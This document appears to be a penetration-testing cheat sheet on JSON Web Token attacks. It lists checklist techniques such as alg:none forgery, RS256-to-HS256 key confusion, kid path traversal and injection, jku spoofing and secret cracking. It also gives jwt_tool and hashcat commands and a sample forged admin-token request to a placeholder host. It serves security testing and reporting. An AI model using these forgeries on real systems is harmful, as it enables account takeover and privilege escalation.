# JWT Attacks

**What it is:** Flaws in JSON Web Token validation → forge tokens, escalate, or take over accounts.

## Test steps
- [ ] `alg:none` — set header `{"alg":"none"}`, strip signature → accepted?
- [ ] Algorithm confusion `RS256→HS256` — sign with the public key as HMAC secret.
- [ ] Weak HMAC secret — crack with `hashcat`/`jwt_tool` + wordlist, then forge.
- [ ] `kid` injection — path traversal (`kid: ../../dev/null`), SQLi, command in `kid`.
- [ ] `jku`/`x5u` header → point to your JWKS/cert (SSRF + forge).
- [ ] Claim tampering — `role`, `isAdmin`, `sub`, `user_id`, `scope`, `tenant` (if sig not checked).
- [ ] No expiry / `exp` ignored / replay old token after logout.
- [ ] Signature not verified at all (change payload, keep old sig → accepted).
- [ ] `sub`/`user_id` swap = IDOR-via-JWT (become another user).
- [ ] Nested/embedded confusion, missing audience/issuer checks.

## Quick commands
```bash
jwt_tool <token> -M at              # all-tests scan
jwt_tool <token> -X a               # alg:none
jwt_tool <token> -C -d wordlist.txt # crack HMAC
jwt_tool <token> -X k -pk public.pem # RS256->HS256 confusion
```

## Impact
Account takeover, privilege escalation, auth bypass.

## Tools
`jwt_tool`, jwt.io, `hashcat -m 16500`, Burp JWT extensions.

## 🎯 PoC — Request → Response

**`alg:none` forgery — strip signature, flip role:**
Header `{"alg":"none","typ":"JWT"}`, payload `{"sub":"me","role":"admin","exp":9999999999}`:
```http
GET /api/v2/admin/users HTTP/2
Host: api.target.com
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJtZSIsInJvbGUiOiJhZG1pbiIsImV4cCI6OTk5OTk5OTk5OX0.
```
```http
HTTP/2 200 OK
Content-Type: application/json

{"users":[{"id":"...","email":"..."},...]}     ← forged admin token accepted
```
(Note trailing dot, empty signature.) A `200` on an admin route with an unsigned token = broken verification. Same shape for RS256→HS256 confusion (sign with the public key as HMAC secret).

## Deep cuts — header, key, and cross-service attacks
- [ ] **Embedded `jwk` header (self-signed key):** put your own public key in the token header `jwk` — if the lib trusts it, sign with your matching private key. `jwt_tool -X i`.
- [ ] **`jku`/`x5u` to your JWKS:** host a JWKS at an attacker (or SSRF-reachable / open-redirect-allowlisted) URL → server fetches your key → forge. Combine with header-injection to point it.
- [ ] **`kid` path traversal / injection:** `kid:"../../../../dev/null"` → empty-string HMAC key (sign with ``); `kid:"/proc/sys/kernel/randomize_va_space"` fixed content; SQLi in `kid` returning a known key; `kid` command injection.
- [ ] **Psychic signature (CVE-2022-21449):** ES256/EC on vulnerable Java (15-18) accepts `r=0,s=0` → a blank signature validates. Try an all-zero ECDSA sig.
- [ ] **`cty`/`typ`/`crit` confusion:** `cty:"...+json"` nesting, unknown `crit` params ignored, `typ` swap to slip validation.
- [ ] **JWE / nested-JWT confusion:** app expects signed (JWS) but accepts encrypted (JWE) with `alg:dir`/`A128KW`, or a JWT-in-JWT where inner claims aren't re-validated.
- [ ] **Audience / issuer / cross-service reuse:** a token minted for service/tenant A accepted by B (`aud`/`iss` not checked) — huge in microservice fleets and multi-tenant SaaS (`01-access-control/05`).
- [ ] **`sub`/`user_id`/`email` swap = IDOR-via-JWT** when only expiry (not signature-to-identity binding) is enforced, or with any forgery above.
- [ ] **Claim injection via mass assignment upstream:** the token faithfully signs whatever the login endpoint accepted — if you smuggled `role:admin` into registration (`07-api/03`), the *legitimately signed* token carries it.
- [ ] **Expiry / revocation gaps:** `exp` absent or far-future, no server-side revocation list, refresh-token replay after rotation, token valid post-logout/-password-change (`06`).
- [ ] **Weak-secret crack** (repeat, but escalate): `hashcat -m 16500`, then look for the same secret reused to sign *other* services' tokens.

## Report notes
Show a forged token accepted by the server performing a privileged/other-user action. Decode and highlight the tampered claim + name the flaw (`alg:none` / RS256→HS256 / jwk / jku / kid / psychic / aud-confusion).
